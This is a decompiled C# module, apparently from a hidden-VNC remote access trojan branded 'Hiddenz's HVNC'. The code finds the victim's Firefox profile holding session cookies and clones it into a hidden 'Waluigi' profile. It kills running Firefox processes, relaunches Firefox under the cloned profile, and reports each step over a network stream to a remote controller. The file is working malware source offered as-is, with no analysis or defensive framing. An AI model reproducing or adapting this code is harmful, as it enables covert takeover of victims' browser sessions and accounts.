using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x02000057 RID: 87
	public class GClass9
	{
		// Token: 0x06000120 RID: 288
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr intptr_0, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6);

		// Token: 0x06000121 RID: 289 RVA: 0x00007A70 File Offset: 0x00005C70
		public static void smethod_0(bool bool_0, bool bool_1, bool bool_2, string String_0)
		{
			try
			{
				if (Conversions.ToBoolean(GClass0.smethod_3(new FileInfo(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi\\parent.lock"))))
				{
					GClass0.smethod_2(GClass0.networkStream_0, "25|Firefox has already been opened!");
				}
				else
				{
					string path = Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles";
					string str = string.Empty;
					if (Directory.Exists(path))
					{
						foreach (string text in Directory.GetDirectories(path))
						{
							if (File.Exists(text + "\\cookies.sqlite"))
							{
								str = Path.GetFileName(text);
								break;
							}
						}
						if (bool_0)
						{
							GClass0.smethod_2(GClass0.networkStream_0, "22|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str) / 1024.0 / 1024.0)));
							GClass2 gclass = new GClass2();
							gclass.method_0(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi");
							try
							{
								GClass0.computer_0.FileSystem.CopyDirectory(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str, Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi", true);
							}
							catch (Exception ex)
							{
							}
							gclass.method_2();
							GClass0.smethod_2(GClass0.networkStream_0, "202|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str) / 1024.0 / 1024.0)));
						}
						else
						{
							GClass0.smethod_2(GClass0.networkStream_0, "203|" + Conversions.ToString(Math.Round((double)new GClass1().method_0(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str) / 1024.0 / 1024.0)));
						}
						Process[] processesByName = Process.GetProcessesByName("firefox");
						for (int j = 0; j < processesByName.Length; j++)
						{
							GClass0.smethod_4(processesByName[j]);
						}
						if (bool_2)
						{
							if (bool_1)
							{
								Process.Start("firefox", string.Concat(new string[]
								{
									"-new-window \"",
									String_0,
									"\" -safe-mode -no-remote -profile \"",
									Interaction.Environ("appdata"),
									"\\Mozilla\\Firefox\\Profiles\\Waluigi\""
								})).WaitForInputIdle();
							}
							else
							{
								Process.Start("firefox", string.Concat(new string[]
								{
									"-new-window \"",
									String_0,
									"\" -safe-mode -no-remote -profile \"",
									Interaction.Environ("appdata"),
									"\\Mozilla\\Firefox\\Profiles\\Waluigi\""
								})).WaitForInputIdle();
							}
						}
						else if (bool_1)
						{
							Process.Start("firefox", "-new-window \"data:text/html,<center><title>Welcome to Hiddenz's HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='black'>Welcome to Hiddenz's HVNC !</font></h1></center>\" -safe-mode -no-remote -profile \"" + Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi\"").WaitForInputIdle();
						}
						else
						{
							Process.Start("firefox", "-new-window \"data:text/html,<center><title>Welcome to Hiddenz's HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='black'>Welcome to Hiddenz's HVNC !</font></h1></center>\" -safe-mode -no-remote -profile \"" + Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi\"").WaitForInputIdle();
						}
						Stopwatch stopwatch = new Stopwatch();
						stopwatch.Start();
						IntPtr intPtr = IntPtr.Zero;
						while (intPtr == IntPtr.Zero)
						{
							Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
							GClass9.SetWindowPos(GClass0.smethod_1("Firefox Safe Mode"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
							intPtr = GClass0.smethod_1("Firefox Safe Mode");
							if (stopwatch.ElapsedMilliseconds >= 5000L)
							{
								break;
							}
							GClass0.smethod_12("Enter");
						}
						stopwatch.Stop();
						GClass0.PostMessage(intPtr, 256U, (IntPtr)13, (IntPtr)1);
						Stopwatch stopwatch2 = new Stopwatch();
						stopwatch2.Start();
						while (GClass0.smethod_1("Welcome to Hiddenz's HVNC !") == (IntPtr)0)
						{
							Rectangle workingArea2 = Screen.AllScreens[0].WorkingArea;
							GClass9.SetWindowPos(GClass0.smethod_1("Welcome to Hiddenz's HVNC !"), 0, workingArea2.Left, workingArea2.Top, workingArea2.Width, workingArea2.Height, 68);
							Application.DoEvents();
							if (stopwatch2.ElapsedMilliseconds >= 5000L)
							{
								processesByName = Process.GetProcessesByName("firefox");
								for (int k = 0; k < processesByName.Length; k++)
								{
									GClass0.smethod_5(processesByName[k]);
								}
								break;
							}
						}
						stopwatch2.Stop();
						processesByName = Process.GetProcessesByName("firefox");
						for (int l = 0; l < processesByName.Length; l++)
						{
							GClass0.smethod_5(processesByName[l]);
						}
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x040000E0 RID: 224
		public const short short_0 = 2;

		// Token: 0x040000E1 RID: 225
		public const short short_1 = 1;

		// Token: 0x040000E2 RID: 226
		public const short short_2 = 4;

		// Token: 0x040000E3 RID: 227
		public const int int_0 = 64;
	}
}
